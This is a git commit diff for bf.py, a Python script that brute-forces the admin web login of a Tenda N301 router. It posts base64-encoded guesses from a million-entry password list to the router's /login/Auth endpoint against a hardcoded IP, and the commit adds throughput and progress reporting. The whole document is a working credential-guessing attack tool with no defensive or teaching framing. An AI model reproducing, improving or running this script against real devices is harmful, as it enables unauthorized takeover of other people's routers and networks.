921f2c9724d466d31c7b532282ce397ed064e7e9
Teitei <teitei@pop-os.localdomain>
2022-05-05 10:21:24 -0300

    Added more information about the process (e.g. passwords/minutes, percentage done...)

--- bf.py
+++ bf.py
@@ -1,5 +1,5 @@
 import requests, base64
-
+import time
 # BruteForce Router Tenda N301
 # Coded by Mugi F.
 # Github https://github.com/mugi789
@@ -15,20 +15,76 @@ print("""\
     |_ _| ___  _ _  _| | ___   | \ |[__ /|   |/ |
      | | / ._]| ' |/ . |[_] |  |   | [_ \| / || |
      |_| \___.|_|_|\___|[___|  |_\_|[___/ \__||_| \033[39m \n""")
-ip = input("Input IP Router : ")
-passwd = input("Input Wordlist : ")
-print("========= Scanning ==========")
-with open(passwd, 'r') as katasandi:
-    for baris in katasandi:
-        kata = baris.replace('\n', '')
-        encode = base64.b64encode(bytes(kata, 'utf-8')).decode('ascii')
-        payload = {
-            'password': encode
-        }
-        login = requests.post('http://'+ip+'/login/Auth', data=payload, allow_redirects=True)
-        if 'http://'+ip+'/index.html' == login.url:
-            print("="*30)
-            print("\033[32mPassword Found\033[39m : " + kata)
-            break
-        else:
-            print("Trying "+kata)
+# ip = input("Input IP Router : ")
+# passwd = input("Input Wordlist : ")
+
+ip  = "192.168.1.1"
+passwd = "10-million-password-list-top-1000000.txt"
+
+
+intervals = 1000
+sleep_interval = 60
+
+def count_number_of_lines(filename):
+    with open(filename) as f:
+        for i, l in enumerate(f):
+            pass
+    return i + 1
+
+# create a function that calculate how many passwords per minute the program runs
+def time_calculator(start_time, end_time):
+    time_taken = end_time - start_time
+    time_taken = time_taken / 60
+    return time_taken 
+
+def brute_force(ip, passwd):
+    print("========= Scanning ==========")
+    with open(passwd, 'r') as passwords:
+        number_of_passwords = count_number_of_lines(passwd)
+        counter = 0
+        start = time.time()
+
+        for baris in passwords:
+            
+            password = baris.replace('\n', '')
+            encode = base64.b64encode(bytes(password, 'utf-8')).decode('ascii')
+            user = base64.b64encode(bytes("admin", 'utf-8')).decode('ascii')
+
+            payload = {
+                'username': user,
+                'password': encode
+            }
+
+            counter += 1
+            try:
+                login = requests.post('http://'+ ip +'/login/Auth', data=payload, allow_redirects=True)
+            except:
+                # print sleeping due to connection error
+                print("[-] Sleeping for {} seconds".format(sleep_interval))
+                time.sleep(sleep_interval)
+
+            if ('http://' + ip + '/index.html' == login.url):
+                print("="*30)
+                print("\033[32mPassword Found\033[39m : " + password)
+                break
+
+            if (counter % intervals == 0):
+                percentage_completed = int((counter / number_of_passwords) * 100)
+
+                end = time.time()
+                time_taken = time_calculator(start, end)
+                password_per_minute = round(counter / time_taken)
+                print("\r[{}%] Password checked | {:,} passwords per minute".format(percentage_completed, password_per_minute), end="")
+
+                # estimated time to finish
+                estimated_time =  (number_of_passwords - counter) / password_per_minute
+                print("\n\n[+] Estimated time to finish: {} minutes".format(round(estimated_time)))
+            
+
+def main():
+    brute_force(ip, passwd)
+
+
+if __name__ == "__main__":
+    main()
+    print("\n\n[+] Done")
